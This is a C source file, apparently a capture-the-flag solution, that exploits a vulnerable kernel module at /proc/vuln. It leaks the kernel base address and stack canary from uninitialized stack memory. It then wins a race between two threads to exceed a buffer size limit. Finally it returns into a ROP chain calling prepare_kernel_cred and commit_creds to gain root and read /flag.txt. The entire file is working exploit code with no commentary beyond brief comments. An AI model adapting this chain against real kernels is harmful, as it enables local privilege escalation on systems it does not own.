#include <pthread.h>
#include <stdint.h>
#include <fcntl.h>
#include <stddef.h>

#include "pwnhelper.h"

typedef struct data
{
    char *content;
    size_t length;
} data;

int fd;
data maindata;
int init_request_running = 1;
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state()
{
    __asm__ __volatile__(
        ".intel_syntax noprefix;"
        "mov %0, cs;"
        "mov %1, ss;"
        "mov %2, rsp;"
        "pushf;"
        "pop %3;"
        ".att_syntax"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags));
}

unsigned long get_value(char *buffer, unsigned long offset)
{
    return *((uint64_t *)(buffer + offset));
}

int save(int fd)
{
    return ioctl(fd, 0x30, 0);
}

int load(int fd, char *buffer, size_t length)
{
    set_value(buffer, 0, length);

    return ioctl(fd, 0x40, buffer);
}

void set_value(char *buffer, unsigned long offset, unsigned long value)
{
    *((uint64_t *)(buffer + offset)) = value;
}

void *threadSwitchLength(void *arg)
{
    puts("Start switching data length");

    while (init_request_running)
    {
        maindata.length = 100;
        usleep(100);
        maindata.length = 0x200;
        usleep(100);
    }
}

void *threadWriteBuffer(void *arg)
{
    puts("Start allocating storage buffer");

    while (init_request_running)
    {
        unsigned long result = ioctl(fd, 0x20, &maindata);

        // Stop when we won the race
        if (result == 0x200)
            init_request_running = 0;
    }
}

void safe_exit(void)
{
    char buffer[100];
    int fd = open("/flag.txt", O_RDONLY);
    read(fd, buffer, 100);
    puts(buffer);
}

int main()
{
    save_state();

    char buffer[0x1000];

    fd = open("/proc/vuln", O_RDWR);

    // Leak kernel and canary from uninitialized stack content
    load(fd, buffer, 239);

    unsigned long kernel_leak = get_value(buffer, 0xe8) + 0xff00000000000000;
    unsigned long kernel_base = kernel_leak - 0x35691f;
    unsigned long canary = get_value(buffer, 0xb0);

    unsigned long prepare_kernel_cred = kernel_base + 0x0895e0;
    unsigned long commit_creds = kernel_base + 0x892c0;
    unsigned long swapgs = kernel_base + 0xc00a2f;
    unsigned long poprdi = kernel_base + 0x2c3a;

    printf("kernel leak      : %p\n", kernel_leak);
    printf("kernel base      : %p\n", kernel_base);
    printf("canary           : %p\n", canary);

    // Prepare rop chain for overwrite in content
    maindata.content = buffer;

    unsigned long *ptr = buffer + 0xf0;

    *ptr++ = canary;
    *ptr++ = 0x0;
    *ptr++ = 0x0;
    *ptr++ = 0x0;
    *ptr++ = poprdi;
    *ptr++ = 0;
    *ptr++ = prepare_kernel_cred;
    *ptr++ = commit_creds;
    *ptr++ = swapgs + 22;
    *ptr++ = 0x0;
    *ptr++ = 0x0;
    *ptr++ = (unsigned long)safe_exit;
    *ptr++ = user_cs;
    *ptr++ = user_rflags;
    *ptr++ = user_sp;
    *ptr++ = user_ss;

    // Race to get a storage with a length > MAX_SIZE
    pthread_t tSwitchLength;
    pthread_t tWriteBuffer;

    pthread_create(&tSwitchLength, NULL, threadSwitchLength, NULL);
    pthread_create(&tWriteBuffer, NULL, threadWriteBuffer, NULL);

    pthread_join(tSwitchLength, NULL);
    pthread_join(tWriteBuffer, NULL);

    // Request is now bigger than content and save will return into ropchain
    save(fd);
}
